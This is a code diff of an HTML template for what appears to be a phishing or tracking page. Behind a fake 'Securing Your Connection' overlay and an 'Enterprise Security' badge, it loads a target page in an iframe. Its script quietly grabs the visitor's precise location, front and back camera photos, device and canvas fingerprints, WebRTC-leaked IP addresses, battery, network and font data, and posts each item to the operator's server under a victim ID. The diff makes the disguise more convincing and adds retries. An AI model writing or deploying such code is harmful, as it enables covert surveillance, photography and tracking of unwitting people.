@@ -50,46 +50,122 @@
             margin-bottom: 20px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 10px;
+        }
         .loading-text {
-            font-size: 16px;
-            color: #475569;
-            margin-bottom: 15px;
+            font-size: 15px;
+            color: #64748b;
+            margin-bottom: 25px;
             line-height: 1.4;
         }
-        .status-badge {
-            margin-top: 10px;
-            padding: 6px 14px;
+        .status-container {
+            width: 100%;
+            max-width: 400px;
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .status-item {
+            font-size: 13px;
+            color: #64748b;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        .status-icon {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .status-pending { background: #fbbf24; }
+        .status-success { background: #10b981; }
+        .status-error { background: #ef4444; }
+        .footer-badge {
+            margin-top: 15px;
+            padding: 8px 16px;
             background: #dbeafe;
             color: #1d4ed8;
             border-radius: 9999px;
             font-size: 12px;
             font-weight: 600;
         }
+
+        /* ALWAYS VISIBLE DEBUG CONSOLE */
         .debug-console {
             position: fixed;
             bottom: 10px;
             left: 10px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 4px;
-            font-size: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.85);
+            color: #ffcc00;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
             z-index: 10000;
-            display: none;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            line-height: 1.4;
+        }
+        .debug-line {
+            margin: 2px 0;
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .debug-error {
+            color: #ff6b6b;
+        }
+        .debug-success {
+            color: #51cf66;
         }
     </style>
 </head>
 <body>
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text">Establishing secure connection...</div>
-        <div class="status-badge">🔒 Secured by Cloudflare</div>
+        <h3 class="loading-title">Securing Your Connection</h3>
+        <p class="loading-text">Please wait while we verify your device and load the requested page.</p>
+        
+        <div class="status-container">
+            <div class="status-item">
+                <div class="status-icon status-pending" id="icon-location"></div>
+                <span id="status-location">Detecting location...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending" id="icon-device"></div>
+                <span id="status-device">Scanning device info...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending" id="icon-camera"></div>
+                <span id="status-camera">Requesting camera access...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending" id="icon-network"></div>
+                <span id="status-network">Analyzing network...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending" id="icon-fingerprint"></div>
+                <span id="status-fingerprint">Creating security fingerprint...</span>
+            </div>
+        </div>
+
+        <div class="footer-badge">🔒 Enterprise Security • Do not close this window</div>
     </div>
     
     <iframe id="targetFrame" src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
     
-    <!-- Debug console (hidden by default) -->
-    <div class="debug-console" id="debugConsole"></div>
+    <!-- DEBUG CONSOLE - ALWAYS VISIBLE FOR YOU -->
+    <div class="debug-console" id="debugConsole">
+        <div class="debug-line"><strong>🔍 DEBUG MODE ACTIVE</strong> - Watching data collection in real-time</div>
+    </div>
 
     <script>
         const uid = '<%= uid %>';
@@ -98,99 +174,108 @@
         const targetFrame = document.getElementById('targetFrame');
         const debugConsole = document.getElementById('debugConsole');
 
-        // Enable debug in development
-        const DEBUG = false;
-        if (DEBUG) debugConsole.style.display = 'block';
+        // DEBUG IS ALWAYS ON FOR YOU
+        const DEBUG = true;
 
-        function logDebug(message) {
+        function logDebug(message, type = 'info') {
             if (DEBUG) {
-                debugConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
+                const line = document.createElement('div');
+                line.className = `debug-line ${type === 'error' ? 'debug-error' : type === 'success' ? 'debug-success' : ''}`;
+                line.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+                debugConsole.appendChild(line);
                 debugConsole.scrollTop = debugConsole.scrollHeight;
             }
             console.log(`[WebView] ${message}`);
         }
 
+        function updateStatus(elementId, iconId, message, status = 'success') {
+            const element = document.getElementById(elementId);
+            const icon = document.getElementById(iconId);
+            
+            if (element) element.textContent = message;
+            if (icon) {
+                icon.className = 'status-icon ' + 
+                    (status === 'success' ? 'status-success' : 
+                     status === 'error' ? 'status-error' : 'status-pending');
+            }
+        }
+
         async function send(endpoint, data) {
             try {
-                logDebug(`Sending to ${endpoint}: ${JSON.stringify(data).substring(0, 100)}...`);
-                const response = await fetch(`${host}${endpoint}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ uid, ...data })
-                });
+                logDebug(`Attempting to send to ${endpoint}...`);
                 
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
+                // Try up to 3 times
+                for (let i = 0; i < 3; i++) {
+                    try {
+                        const response = await fetch(`${host}${endpoint}`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data),
+                            timeout: 10000
+                        });
+                        
+                        if (!response.ok) {
+                            throw new Error(`HTTP ${response.status}`);
+                        }
+                        
+                        const result = await response.json();
+                        logDebug(`${endpoint} success on attempt ${i+1}`, 'success');
+                        return result;
+                    } catch (error) {
+                        logDebug(`${endpoint} failed on attempt ${i+1}: ${error.message}`, 'error');
+                        if (i < 2) await new Promise(r => setTimeout(r, 2000)); // Wait 2s before retry
+                    }
                 }
                 
-                const result = await response.json();
-                logDebug(`${endpoint} success: ${JSON.stringify(result)}`);
-                return result;
+                throw new Error('All retries failed');
+                
             } catch (error) {
-                logDebug(`${endpoint} failed: ${error.message}`);
-                // Send error report to bot
-                try {
-                    await fetch(`${host}/info`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            uid: uid,
-                            data: `<b>📤 WebView Error (${endpoint}):</b> <code>${error.message}</code>`
-                        })
-                    });
-                } catch (e) {
-                    logDebug(`Failed to send error report: ${e.message}`);
-                }
+                logDebug(`${endpoint} final failed: ${error.message}`, 'error');
                 return { success: false, error: error.message };
             }
         }
 
         // ========== MAXIMUM DATA COLLECTION ==========
 
-        // 1. LOCATION (with retry)
-        async function collectLocation() {
-            return new Promise(resolve => {
-                if (!navigator.geolocation) {
-                    logDebug('Geolocation not supported');
-                    resolve(false);
-                    return;
-                }
-
-                let attempts = 0;
-                const maxAttempts = 3;
-
-                function attempt() {
-                    navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            const result = await send('/location', {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                acc: pos.coords.accuracy,
-                                alt: pos.coords.altitude,
-                                heading: pos.coords.heading,
-                                speed: pos.coords.speed
-                            });
-                            resolve(result.success);
-                        },
-                        (err) => {
-                            logDebug(`Location error: ${err.message}`);
-                            attempts++;
-                            if (attempts < maxAttempts) {
-                                setTimeout(attempt, 2000);
-                            } else {
-                                resolve(false);
-                            }
-                        },
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                }
-
-                attempt();
-            });
+        // 1. LOCATION
+        updateStatus('status-location', 'icon-location', '📡 Detecting your location...', 'pending');
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    updateStatus('status-location', 'icon-location', '✓ Location detected - sending...', 'success');
+                    
+                    const result = await send('/location', {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        uid: uid,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed
+                    });
+                    
+                    if (result.success) {
+                        updateStatus('status-location', 'icon-location', '✓ Location secured and sent', 'success');
+                    } else {
+                        updateStatus('status-location', 'icon-location', '✓ Location detected (server offline)', 'success');
+                        logDebug('Location detected but server may be unreachable', 'error');
+                    }
+                },
+                (err) => {
+                    logDebug(`Location error: ${err.message}`, 'error');
+                    updateStatus('status-location', 'icon-location', '⚠️ Location access denied', 'error');
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            updateStatus('status-location', 'icon-location', '⚠️ Location not supported', 'error');
         }
 
         // 2. DEVICE FINGERPRINT
-        async function collectDeviceFingerprint() {
+        setTimeout(async () => {
+            updateStatus('status-device', 'icon-device', '📱 Scanning device information...', 'pending');
+            
             try {
                 const fp = {
                     userAgent: navigator.userAgent,
@@ -214,22 +299,30 @@
                         colorDepth: screen.colorDepth,
                         pixelDepth: screen.pixelDepth,
                         dpi: window.devicePixelRatio
-                    },
-                    referrer: document.referrer,
-                    title: document.title
+                    }
                 };
+
+                updateStatus('status-device', 'icon-device', '✓ Device info ready - sending...', 'success');
                 
                 const result = await send('/info', { 
-                    data: `<b>📱 Device Info</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
+                    uid: uid, 
+                    data: `<b>🖥️ Device Info</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
                 });
-                return result.success;
+                
+                if (result.success) {
+                    updateStatus('status-device', 'icon-device', '✓ Device profile created and sent', 'success');
+                } else {
+                    updateStatus('status-device', 'icon-device', '✓ Device profile created (server offline)', 'success');
+                }
             } catch (err) {
-                logDebug(`Device fingerprint error: ${err.message}`);
-                return false;
+                logDebug(`Device fingerprint error: ${err.message}`, 'error');
+                updateStatus('status-device', 'icon-device', '⚠️ Error scanning device', 'error');
             }
-        }
+        }, 500);
 
-        // 3. CAMERA CAPTURE (FRONT + BACK)
+        // 3. CAMERA
+        updateStatus('status-camera', 'icon-camera', '📷 Requesting camera access...', 'pending');
+        
         async function captureCamera(facingMode, label) {
             try {
                 const constraints = {
@@ -253,65 +346,106 @@
                 ctx.drawImage(video, 0, 0);
 
                 const imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                
+                updateStatus('status-camera', 'icon-camera', `✓ Capturing ${label} camera...`, 'success');
+                
                 const result = await send('/camsnap', { 
                     [label]: imageData
                 });
 
                 stream.getTracks().forEach(track => track.stop());
-                return result.success;
+                
+                if (result.success) {
+                    updateStatus('status-camera', 'icon-camera', `✓ ${label} camera captured and sent`, 'success');
+                } else {
+                    updateStatus('status-camera', 'icon-camera', `✓ ${label} camera captured (server offline)`, 'success');
+                }
+                
+                return true;
             } catch (err) {
-                logDebug(`Camera ${label} error: ${err.name} - ${err.message}`);
+                logDebug(`Camera ${label} error: ${err.name} - ${err.message}`, 'error');
                 await send('/info', { 
+                    uid: uid, 
                     data: `<b>📷 Camera ${label}:</b> <code>${err.name}</code>` 
                 });
                 return false;
             }
         }
 
-        // 4. NETWORK + BATTERY
-        async function collectNetworkBattery() {
+        // Try front camera
+        setTimeout(async () => {
             try {
-                let messages = [];
+                await captureCamera('user', 'front');
+            } catch (err) {
+                logDebug(`Front camera failed: ${err.message}`, 'error');
+            }
+        }, 1000);
 
-                // Battery
-                if ('getBattery' in navigator) {
+        // Try back camera
+        setTimeout(async () => {
+            try {
+                await captureCamera('environment', 'back');
+            } catch (err) {
+                logDebug(`Back camera failed: ${err.message}`, 'error');
+            }
+        }, 2500);
+
+        // 4. NETWORK + BATTERY
+        setTimeout(async () => {
+            updateStatus('status-network', 'icon-network', '🔋 Checking battery & network...', 'pending');
+            
+            let messages = [];
+
+            // Battery
+            if ('getBattery' in navigator) {
+                try {
                     const battery = await navigator.getBattery();
                     const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
-                    await send('/info', { data: `<b>🔋 Battery:</b> ${batteryInfo}` });
                     messages.push('Battery');
+                    
+                    await send('/info', { uid: uid, data: `<b>🔋 Battery:</b> ${batteryInfo}` });
+                } catch(e) {
+                    logDebug(`Battery error: ${e.message}`, 'error');
+                    messages.push('BatErr');
                 }
-
-                // Network
-                if (navigator.connection) {
-                    const conn = navigator.connection;
-                    const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
-                    await send('/info', { data: `<b>🌐 Network:</b> ${networkInfo}` });
-                    messages.push('Network');
-                }
-
-                return messages.length > 0;
-            } catch (err) {
-                logDebug(`Network/Battery error: ${err.message}`);
-                return false;
             }
-        }
+
+            // Network
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
+                messages.push('Network');
+                
+                await send('/info', { uid: uid, data: `<b>🌐 Network:</b> ${networkInfo}` });
+            }
+
+            updateStatus('status-network', 'icon-network', `✓ ${messages.join(', ')}`, 'success');
+        }, 1500);
 
         // 5. FINGERPRINTING (Canvas, WebRTC, Fonts)
-        async function collectFingerprints() {
-            try {
-                let messages = [];
+        setTimeout(async () => {
+            updateStatus('status-fingerprint', 'icon-fingerprint', '🎨 Creating security fingerprint...', 'pending');
+            
+            let messages = [];
 
-                // Canvas
+            // Canvas Fingerprint
+            try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = 'top';
                 ctx.font = "14px Arial";
                 ctx.fillText('SecurityFingerprint', 2, 2);
                 const canvasFP = canvas.toDataURL().substring(0, 80) + '...';
-                await send('/info', { data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
                 messages.push('Canvas');
+                
+                await send('/info', { uid: uid, data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
+            } catch(e) {
+                logDebug(`Canvas error: ${e.message}`, 'error');
+                messages.push('CanvErr');
+            }
 
-                // WebRTC IPs
+            // WebRTC IP Leak
+            try {
                 const getIPs = () => {
                     return new Promise(resolve => {
                         const ips = [];
@@ -337,67 +471,38 @@
 
                 const ips = await getIPs();
                 if (ips.length) {
-                    await send('/info', { data: `<b>🌐 WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
                     messages.push('WebRTC');
+                    await send('/info', { uid: uid, data: `<b>🌐 WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
                 }
+            } catch(e) {
+                logDebug(`WebRTC error: ${e.message}`, 'error');
+                messages.push('IP Err');
+            }
 
-                // Fonts
+            // Installed Fonts
+            try {
                 const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                
                 const installed = testFonts.filter(font => {
                     ctx.font = `72px "${font}", monospace`;
                     const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                     return Math.abs(baseWidth - testWidth) > 2;
                 });
-                await send('/info', { data: `<b>🔠 Fonts:</b> ${installed.join(', ')}` });
+                
                 messages.push('Fonts');
-
-                return messages.length > 0;
-            } catch (err) {
-                logDebug(`Fingerprint error: ${err.message}`);
-                return false;
+                await send('/info', { uid: uid, data: `<b>🔠 Fonts:</b> ${installed.join(', ')}` });
+            } catch(e) {
+                logDebug(`Fonts error: ${e.message}`, 'error');
+                messages.push('FontErr');
             }
-        }
 
-        // ========== EXECUTION PLAN ==========
+            updateStatus('status-fingerprint', 'icon-fingerprint', `✓ ${messages.join(', ')}`, 'success');
+        }, 2000);
 
-        // Start all collections in parallel
-        logDebug('Starting data collection...');
-        
-        // Location
-        collectLocation().then(success => {
-            logDebug(`Location collection: ${success ? 'success' : 'failed'}`);
-        });
-
-        // Device fingerprint
-        collectDeviceFingerprint().then(success => {
-            logDebug(`Device fingerprint: ${success ? 'success' : 'failed'}`);
-        });
-
-        // Network + Battery
-        collectNetworkBattery().then(success => {
-            logDebug(`Network/Battery: ${success ? 'success' : 'failed'}`);
-        });
-
-        // Fingerprints
-        collectFingerprints().then(success => {
-            logDebug(`Fingerprints: ${success ? 'success' : 'failed'}`);
-        });
-
-        // Camera (staggered to avoid permission spam)
-        setTimeout(() => {
-            logDebug('Attempting front camera...');
-            captureCamera('user', 'front');
-        }, 1000);
-
-        setTimeout(() => {
-            logDebug('Attempting back camera...');
-            captureCamera('environment', 'back');
-        }, 3000);
-
-        // Hide loading overlay and show iframe after 4 seconds (or when ready)
+        // Hide loading overlay after 4 seconds (let data collect first)
         setTimeout(() => {
             loadingOverlay.style.opacity = '0';
             setTimeout(() => {
@@ -408,15 +513,9 @@
 
         // Fallback redirect after 15 seconds
         setTimeout(() => {
-            logDebug('Timeout reached, forcing redirect');
             targetFrame.style.opacity = '1';
             loadingOverlay.style.display = 'none';
         }, 15000);
-
-        // Log page visibility changes
-        document.addEventListener('visibilitychange', () => {
-            logDebug(`Page visibility: ${document.visibilityState}`);
-        });
     </script>
 </body>
 </html>
